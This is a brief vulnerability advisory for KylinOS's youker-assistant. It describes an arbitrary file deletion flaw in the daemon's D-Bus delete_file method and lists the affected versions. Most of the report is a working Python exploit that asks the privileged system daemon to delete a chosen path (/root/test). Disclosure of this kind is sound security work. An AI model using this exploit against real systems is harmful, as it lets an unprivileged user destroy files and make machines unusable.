# Kylin OS youker-assistant arbitrary file delete vuln

Author: Set3r.Pan（8691003@qq.com）\
Unit: KylinSoft（https://www.kylinos.cn/）
## Report
### Describe
youker-assistant is an integrated tool on KylinOS Desktop to help perform daily system maintenance tasks. The delete_file in this program has an arbitrary file deletion vulnerability, which can cause the system to be unavailable.
### Hazard level
High
### Affected version
- youker-assistant < 3.0.2-0kylin6k70-23
### POC&&EXP
ISO Download:\
https://distro-images.kylinos.cn:8802/web_pungi/download/share/HXDYtGjZm3daA4UvOTLkiPl1nB9ErM0c/

exploit.py
```
import dbus

filepath = "/root/test"

bus = dbus.SystemBus()

obj = bus.get_object('com.kylin.assistant.systemdaemon','/com/kylin/assistant/systemdaemon')

obj.delete_file(filepath,dbus_interface = 'com.kylin.assistant.systemdaemon')
```
